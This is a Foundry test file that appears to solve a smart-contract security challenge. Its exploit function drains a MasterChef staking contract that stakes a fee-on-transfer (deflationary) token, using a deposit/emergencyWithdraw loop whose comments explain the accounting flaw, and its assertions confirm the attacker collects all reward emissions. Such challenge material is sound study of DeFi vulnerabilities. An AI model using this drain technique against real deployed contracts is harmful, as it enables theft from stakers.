// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {Token} from "src/other/Token.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MulaToken} from "src/inflationary-net-worth/MulaToken.sol";
import {MasterChef,IMuny} from "src/inflationary-net-worth/MasterChef.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    MulaToken mula;
    Token muny;
    MasterChef masterChef;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contracts
        vm.prank(admin);
        mula = new MulaToken('MULA','MULA'); // staking token

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0]=adminUser; addresses[1]=attacker;
        amounts[0]=10_000e18; amounts[1]=10_000e18;
        vm.prank(admin);
        mula.mintPerUser(addresses,amounts);

        vm.prank(admin);
        muny = new Token('MUNY','MUNY'); // reward token

        // deploying core contracts
        vm.prank(admin);
        masterChef = new MasterChef(
            IMuny(address(muny)),
            admin,
            1e18,
            block.number,
            block.number
        );

        vm.prank(admin);
        muny.transferOwnership(address(masterChef));

        // start MULA staking
        vm.prank(admin);
        masterChef.add(1000,IERC20(mula),false); // init staking

        vm.prank(adminUser);
        mula.approve(address(masterChef),type(uint).max);
        vm.prank(adminUser);
        masterChef.deposit(0,10_000e18);

        // simulate staking over time
        vm.roll(120); // 120 blocks

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
        //Inside deposit() our balance (user.amount) is increased by _amount
        //However the token is deflationnary burn 5% of amount  per swap:
        //If we send 10_000e18 in reality masterChef will receive 9_500e18 but our balance is increased by 10_000e18
        //So  we will be able to withdraw 10_000e18 to masterChef and we will receive 9_500e18
        //During this operation the balance of masterChef will loose 500e18 
        //If we make a loop we will be able to reduce the lpSupply till our user.amount > balance of masterChef
        //Another thing, there is a logic error but not important for our case  at L202.We are added the previous pool.accMunyShare with the newest so we're artificially increase the muny per share 

        mula.approve(address(masterChef),type(uint).max);
        bool first = true;
        uint count;
        uint amount;
        //Loop for decrease the lpSupply inside masterChef until we are not able to withdraw our amount deposited
        while( mula.balanceOf(address(masterChef)) > amount || first){ //uint256(38e18)
            if(first){
                 first=false;     
            }
            else{
                masterChef.emergencyWithdraw(0);
                console.log("balance attacker - withdraw: ",mula.balanceOf(address(attacker)) );
                console.log("balance masterChef - withdraw: ", mula.balanceOf(address(masterChef)) );
            }
            amount = mula.balanceOf(address(attacker));
            console.log("amount : ",amount);
            masterChef.deposit(0,mula.balanceOf(address(attacker)));
            ++count;
            console.log("count : ",count);
            console.log("balance attacker - deposit: ",mula.balanceOf(address(attacker)) );
            console.log("balance masterChef - deposit: ", mula.balanceOf(address(masterChef)) );
            

        }
        //Here we are not able to withdraw the amount deposited because user.amount > lpSupply
        console.log("balance attacker : ",mula.balanceOf(address(attacker)) );
        console.log("balance masterChef : ", mula.balanceOf(address(masterChef)) );
        //Withdraw all the lpSupply in order to manipulate pool.accMunyPerShare and be able to claim all the fees after that 
        masterChef.withdraw(0,mula.balanceOf(address(masterChef))-1);
        console.log("balance masterChef : ", mula.balanceOf(address(masterChef)), "balance user.amount : ", amount -(mula.balanceOf(address(masterChef))-1));
    
        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker must receive all rewards in a single call to deposit
        vm.roll(block.number+1);
        vm.prank(attacker);
        masterChef.deposit(0,1);

        // attacker drains all farm emissions up to this block
        assertEq(muny.balanceOf(attacker),120e18); // 1e18 per block for 120 blocks
        assertEq(muny.balanceOf(adminUser),0);
        assertEq(muny.balanceOf(address(masterChef)),0);

    }

}